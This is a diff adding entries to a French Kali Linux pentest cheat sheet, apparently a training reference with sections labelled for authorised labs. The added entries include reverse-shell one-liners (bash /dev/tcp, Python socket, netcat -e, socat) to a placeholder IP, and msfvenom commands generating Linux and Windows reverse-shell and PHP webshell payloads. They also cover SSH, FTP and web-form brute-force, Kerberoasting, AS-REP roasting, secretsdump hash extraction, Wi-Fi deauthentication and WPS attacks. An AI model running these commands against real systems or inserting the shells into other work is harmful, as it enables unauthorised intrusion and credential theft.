@@ -13,6 +13,9 @@ sudo apt update && sudo apt full-upgrade -y
 # apt install : Installer un outil
 sudo apt install <paquet>
 
+# apt search : Chercher un paquet
+apt search <mot-clé>
+
 # kali-tweaks : Configurer Kali (shells, réseau, métapaquets)
 sudo kali-tweaks
 
@@ -31,6 +34,18 @@ id
 # uname : Version du noyau et de l'OS
 uname -a
 
+# ip a : Afficher les interfaces réseau
+ip a
+
+# ifconfig : Configurer/afficher une interface
+sudo ifconfig eth0
+
+# history : Historique des commandes
+history | less
+
+# tmux : Multiplexeur de terminal (sessions persistantes)
+tmux new -s pentest
+
 
 # === 🔍 Reconnaissance & OSINT — Collecte d'informations passive et active ===
 
@@ -40,8 +55,14 @@ whois exemple.com
 # dig : Requêtes DNS détaillées
 dig exemple.com ANY +noall +answer
 
+# dig AXFR : Tenter un transfert de zone DNS
+dig AXFR exemple.com @<serveur-dns>
+
 # host : Résolution DNS rapide
 host -a exemple.com
+
+# nslookup : Interroger un serveur DNS
+nslookup exemple.com
 
 # dnsrecon : Énumération DNS (transfert de zone, brute)
 dnsrecon -d exemple.com
@@ -55,6 +76,12 @@ theHarvester -d exemple.com -b all
 # sublist3r : Énumération de sous-domaines
 sublist3r -d exemple.com
 
+# amass : Cartographie de surface d'attaque
+amass enum -d exemple.com
+
+# assetfinder : Trouver des domaines/sous-domaines liés
+assetfinder exemple.com
+
 # fierce : Reconnaissance DNS
 fierce --domain exemple.com
 
@@ -63,6 +90,12 @@ recon-ng
 
 # maltego : Analyse de liens et OSINT graphique
 maltego
+
+# spiderfoot : Automatisation OSINT
+spiderfoot -l 127.0.0.1:5001
+
+# wafw00f : Détecter un pare-feu applicatif (WAF)
+wafw00f http://exemple.com
 
 
 # === 📡 Scan réseau & ports — Découverte d'hôtes et de services ===
@@ -79,6 +112,15 @@ sudo nmap -A -O <cible>
 # nmap : Découverte d'hôtes (ping sweep)
 nmap -sn 192.168.1.0/24
 
+# nmap : Scan UDP des ports courants
+sudo nmap -sU --top-ports 100 <cible>
+
+# nmap : Scan furtif SYN
+sudo nmap -sS <cible>
+
+# nmap : Sauvegarder tous les formats de sortie
+nmap -sV -oA scan <cible>
+
 # masscan : Scan de ports très rapide
 sudo masscan <cible>/24 -p1-65535 --rate=1000
 
@@ -91,6 +133,48 @@ sudo arp-scan --localnet
 # rustscan : Scan de ports ultra-rapide
 rustscan -a <cible> -- -sV
 
+# fping : Ping multiple d'une plage
+fping -a -g 192.168.1.0/24 2>/dev/null
+
+
+# === 🗂️ Énumération de services — SMB, FTP, SNMP, SMTP, NFS… ===
+
+# enum4linux-ng : Énumération SMB/Windows complète
+enum4linux-ng -A <cible>
+
+# smbclient : Lister les partages SMB
+smbclient -L //<cible>/ -N
+
+# smbmap : Cartographier les partages et droits SMB
+smbmap -H <cible>
+
+# crackmapexec : Énumération/authentification SMB
+crackmapexec smb <cible>
+
+# nmap smb : Scripts SMB (partages, vulns)
+nmap --script smb-enum-shares,smb-os-discovery <cible>
+
+# showmount : Lister les exports NFS
+showmount -e <cible>
+
+# snmpwalk : Interroger SNMP (community public)
+snmpwalk -v2c -c public <cible>
+
+# onesixtyone : Brute-force de community SNMP
+onesixtyone -c community.txt <cible>
+
+# ftp : Se connecter en FTP
+ftp <cible>
+
+# smtp-user-enum : Énumérer les utilisateurs SMTP
+smtp-user-enum -M VRFY -U users.txt -t <cible>
+
+# rpcclient : Requêtes RPC anonymes
+rpcclient -U "" -N <cible>
+
+# ldapsearch : Interroger un annuaire LDAP
+ldapsearch -x -H ldap://<cible> -b "dc=exemple,dc=com"
+
 
 # === 🌐 Web — énumération & scan — Applications et serveurs web ===
 
@@ -100,11 +184,23 @@ gobuster dir -u http://<cible> -w /usr/share/wordlists/dirb/common.txt
 # gobuster : Énumération de sous-domaines (vhost)
 gobuster vhost -u http://<cible> -w <wordlist>
 
+# gobuster dns : Brute-force de sous-domaines
+gobuster dns -d exemple.com -w <wordlist>
+
 # ffuf : Fuzzing web rapide
 ffuf -u http://<cible>/FUZZ -w /usr/share/wordlists/dirb/common.txt
 
+# ffuf : Fuzzing de paramètres GET
+ffuf -u 'http://<cible>/?FUZZ=test' -w <wordlist> -fs 0
+
+# feroxbuster : Brute-force récursif de contenu
+feroxbuster -u http://<cible>
+
 # dirb : Scanner de contenu web
 dirb http://<cible>
+
+# dirsearch : Découverte de chemins web
+dirsearch -u http://<cible>
 
 # nikto : Scanner de vulnérabilités web
 nikto -h http://<cible>
@@ -115,11 +211,20 @@ whatweb http://<cible>
 # wpscan : Scan de sécurité WordPress
 wpscan --url http://<cible> --enumerate u
 
+# joomscan : Scanner Joomla
+joomscan --url http://<cible>
+
 # sqlmap : Détection/exploitation d'injections SQL
 sqlmap -u "http://<cible>/page?id=1" --batch --dbs
 
+# sqlmap : SQLi depuis une requête capturée
+sqlmap -r requete.txt --batch --dump
+
 # wfuzz : Fuzzing de paramètres web
 wfuzz -c -z file,<wordlist> http://<cible>/FUZZ
+
+# curl : Requête HTTP avec en-têtes
+curl -i -L http://<cible>
 
 # burpsuite : Proxy d'interception web
 burpsuite
@@ -133,11 +238,20 @@ nmap --script vuln <cible>
 # searchsploit : Rechercher un exploit connu
 searchsploit apache 2.4
 
+# searchsploit -x : Afficher un exploit
+searchsploit -x <chemin>
+
 # nuclei : Scan de vulnérabilités par templates
 nuclei -u http://<cible>
 
+# nuclei : Scan avec templates critiques
+nuclei -u http://<cible> -severity critical,high
+
 # openvas / gvm : Scanner de vulnérabilités complet
 sudo gvm-setup && sudo gvm-start
+
+# wpscan : Vulnérabilités WordPress (API token)
+wpscan --url http://<cible> --api-token <token>
 
 
 # === 💥 Exploitation — Frameworks et exploitation (labs autorisés) ===
@@ -145,8 +259,17 @@ sudo gvm-setup && sudo gvm-start
 # msfconsole : Lancer Metasploit
 msfconsole
 
-# msfvenom : Générer un payload de test
+# msfconsole -q : Lancer un module directement
+msfconsole -q -x "use exploit/multi/handler"
+
+# msfvenom : Payload reverse shell Linux
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
+
+# msfvenom : Payload reverse shell Windows
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe
+
+# msfvenom : Webshell PHP
+msfvenom -p php/reverse_php LHOST=<ip> LPORT=4444 -f raw -o shell.php
 
 # searchsploit -m : Copier un exploit localement
 searchsploit -m <chemin/exploit>
@@ -154,17 +277,62 @@ searchsploit -m <chemin/exploit>
 # netcat : Écouteur pour reverse shell
 nc -lvnp 4444
 
+# rlwrap nc : Écouteur avec historique/édition
+rlwrap nc -lvnp 4444
+
+
+# === 🐚 Reverse shells & upgrade — Obtenir et stabiliser un shell (labs) ===
+
+# bash : Reverse shell Bash
+bash -i >& /dev/tcp/<ip>/4444 0>&1
+
+# python : Reverse shell Python
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ip>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+
+# nc : Reverse shell netcat
+nc <ip> 4444 -e /bin/bash
+
+# pty upgrade : Stabiliser un shell interactif
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# stty : Récupérer un shell pleinement interactif
+stty raw -echo; fg
+
+# socat : Reverse shell chiffré
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:4444
+
 
 # === 🔑 Mots de passe & hachages — Cassage de mots de passe (comptes autorisés) ===
 
 # hydra : Brute-force de service (ex. SSH)
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<cible>
 
+# hydra : Brute-force de formulaire web POST
+hydra -l admin -P rockyou.txt <cible> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
+
+# hydra : Brute-force FTP
+hydra -L users.txt -P rockyou.txt ftp://<cible>
+
 # john : Cassage de hachages (John the Ripper)
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
+# john --show : Afficher les mots de passe cassés
+john --show hashes.txt
+
+# zip2john : Extraire le hash d'un zip protégé
+zip2john fichier.zip > zip.hash
+
+# ssh2john : Extraire le hash d'une clé SSH
+ssh2john id_rsa > ssh.hash
+
 # hashcat : Cassage GPU (ex. MD5 mode 0)
 hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# hashcat : Cassage NTLM (mode 1000)
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt
+
+# hashcat rules : Attaque par dictionnaire + règles
+hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
 # hash-identifier : Identifier un type de hachage
 hash-identifier
@@ -178,16 +346,28 @@ medusa -h <cible> -u admin -P rockyou.txt -M ssh
 # crunch : Générer une wordlist
 crunch 6 8 abc123 -o wordlist.txt
 
+# cupp : Wordlist personnalisée (profil)
+cupp -i
+
+# cewl : Générer une wordlist depuis un site
+cewl http://<cible> -w wordlist.txt
+
 
 # === 📶 Wi-Fi & sans-fil — Audit de réseaux sans-fil (vos propres réseaux) ===
 
 # airmon-ng : Passer la carte en mode monitor
 sudo airmon-ng start wlan0
 
+# airmon-ng check kill : Tuer les processus gênants
+sudo airmon-ng check kill
+
 # airodump-ng : Capturer le trafic Wi-Fi
 sudo airodump-ng wlan0mon
 
-# aireplay-ng : Injection / désauthentification (test)
+# airodump-ng : Cibler un réseau et sauvegarder
+sudo airodump-ng -c <canal> --bssid <BSSID> -w capture wlan0mon
+
+# aireplay-ng : Désauthentification (test)
 sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
 
 # aircrack-ng : Casser une capture WPA (autorisée)
@@ -196,11 +376,20 @@ aircrack-ng -w rockyou.txt capture.cap
 # wifite : Audit Wi-Fi automatisé
 sudo wifite
 
+# reaver : Attaque WPS (réseau autorisé)
+sudo reaver -i wlan0mon -b <BSSID> -vv
+
+# kismet : Détection réseaux sans-fil
+sudo kismet -c wlan0mon
+
 
 # === 🕵️ Sniffing & MITM — Analyse de trafic (réseau autorisé) ===
 
 # wireshark : Analyseur de paquets graphique
 wireshark
+
+# tshark : Wireshark en ligne de commande
+sudo tshark -i eth0 -f "port 80"
 
 # tcpdump : Capture de paquets en ligne de commande
 sudo tcpdump -i eth0 -w capture.pcap
@@ -214,11 +403,20 @@ sudo bettercap -iface eth0
 # responder : Empoisonnement LLMNR/NBT-NS (lab)
 sudo responder -I eth0
 
+# mitmproxy : Proxy HTTP(S) interactif
+mitmproxy
+
 
 # === ⬆️ Post-exploitation & privesc — Escalade de privilèges et énumération locale ===
 
 # linpeas : Énumération d'escalade Linux
 ./linpeas.sh
+
+# winpeas : Énumération d'escalade Windows
+winpeas.exe
+
+# linenum : Script d'énumération Linux
+./LinEnum.sh
 
 # sudo -l : Lister les droits sudo
 sudo -l
@@ -226,8 +424,92 @@ sudo -l
 # find SUID : Chercher les binaires SUID
 find / -perm -4000 -type f 2>/dev/null
 
+# getcap : Chercher les capabilities
+getcap -r / 2>/dev/null
+
+# crontab : Lister les tâches planifiées
+cat /etc/crontab
+
+# pspy : Surveiller les processus sans root
+./pspy64
+
 # python shell : Stabiliser un shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+# === 🪟 Active Directory & Windows — Environnements Windows / AD (labs autorisés) ===
+
+# crackmapexec : Pulvérisation d'identifiants SMB
+crackmapexec smb <plage> -u users.txt -p 'Password1'
+
+# impacket-GetNPUsers : AS-REP Roasting
+impacket-GetNPUsers exemple.local/ -usersfile users.txt -no-pass
+
+# impacket-GetUserSPNs : Kerberoasting
+impacket-GetUserSPNs exemple.local/user:pass -request
+
+# impacket-secretsdump : Extraire les hachages (autorisé)
+impacket-secretsdump exemple.local/user:pass@<cible>
+
+# impacket-psexec : Exécution à distance
+impacket-psexec exemple.local/user:pass@<cible>
+
+# evil-winrm : Shell WinRM
+evil-winrm -i <cible> -u user -p pass
+
+# bloodhound-python : Collecter les données AD
+bloodhound-python -u user -p pass -d exemple.local -c all
+
+# smbclient : Accéder à un partage authentifié
+smbclient //<cible>/partage -U user
+
+
+# === 📁 Transfert de fichiers — Envoyer/récupérer des fichiers vers la cible ===
+
+# python http : Serveur HTTP local
+python3 -m http.server 8000
+
+# wget : Télécharger un fichier sur la cible
+wget http://<ip>:8000/fichier
+
+# curl -O : Télécharger avec curl
+curl -O http://<ip>:8000/fichier
+
+# scp : Copie sécurisée via SSH
+scp fichier user@<cible>:/tmp/
+
+# nc transfert : Recevoir un fichier (récepteur)
+nc -lvnp 4444 > fichier
+
+# nc transfert : Envoyer un fichier (émetteur)
+nc <ip> 4444 < fichier
+
+# smbserver : Partage SMB temporaire
+impacket-smbserver share . -smb2support
+
+
+# === 🔐 Encodage & cryptographie — Encodage, décodage et manipulation de données ===
+
+# base64 : Encoder / décoder base64
+echo -n 'texte' | base64
+
+# base64 -d : Décoder base64
+echo '<b64>' | base64 -d
+
+# xxd : Dump hexadécimal
+xxd fichier | less
+
+# openssl : Hacher une chaîne (SHA-256)
+echo -n 'texte' | openssl dgst -sha256
+
+# openssl : Générer un hash de mot de passe
+openssl passwd -6 'motdepasse'
+
+# gpg : Chiffrer un fichier
+gpg -c fichier
+
+# cyberchef : Boîte à outils d'encodage (web/local)
+cyberchef
 
 
 # === 🔬 Forensics & stéganographie — Analyse et récupération ===
@@ -238,6 +520,9 @@ binwalk -e fichier.bin
 # steghide : Extraire des données cachées
 steghide extract -sf image.jpg
 
+# stegseek : Brute-force de steghide
+stegseek image.jpg rockyou.txt
+
 # exiftool : Lire les métadonnées
 exiftool image.jpg
 
@@ -246,3 +531,12 @@ foremost -i disk.img -o sortie/
 
 # strings : Extraire les chaînes lisibles
 strings fichier.bin | less
+
+# file : Identifier un type de fichier
+file fichier
+
+# volatility : Analyse de dump mémoire
+volatility -f dump.raw imageinfo
+
+# zsteg : Détecter la stégano dans un PNG/BMP
+zsteg image.png
